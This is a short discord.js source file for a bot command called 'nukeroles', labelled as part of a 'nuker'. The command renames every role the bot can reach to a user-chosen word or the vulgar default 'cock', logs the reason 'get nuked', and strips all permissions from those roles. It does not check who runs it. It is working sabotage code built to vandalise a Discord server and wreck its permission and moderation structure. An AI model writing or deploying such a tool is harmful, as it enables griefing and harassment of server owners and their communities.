const { CommandInteraction, CommandInteractionOptionResolver, GuildMember, User, PermissionsBitField, ApplicationCommandOptionType } = require("discord.js");

module.exports = {
    name: `nukeroles`,
    options: [
        {
            name: `name`,
            description: `The new role name`,
            type: ApplicationCommandOptionType.String,
            required: false
        }
    ],

    /**
     * 
     * @param {CommandInteraction} interaction 
     * @param {CommandInteractionOptionResolver} options 
     * @param {GuildMember} member 
     * @param {User} user 
     */

    async execute(interaction, options, member, user) {
        const { me } = interaction.guild.members;
        if(!me.permissions.has(PermissionsBitField.Flags.ManageRoles)) return console.log(`[ERROR] I'm missing the permission ManageRoles (1 << 28)! [${interaction.guild.name}]`);
        const roles = await interaction.guild.roles.fetch();
        roles.forEach(async role => {
            if(role.name == `@everyone`) return;
            if(role.position >= me.roles.highest.position) return console.log(`[ROLE] Skipped ${role.name} (${role.id}): Higher or same position`);
            const oldname = role.name;
            await role.setName(options.getString(`name`) || `cock`, `get nuked [rappytv's nuker]`).then(() => {
                return console.log(`[ROLE] Edited ${oldname} -> ${role.name} (${role.id})`);
            }).catch((err) => {
                return console.log(`[ROLE] Failed to edit ${oldname} (${role.id}): ${err}`);
            });
            role.setPermissions([]).catch(() => {});
        });
    }
}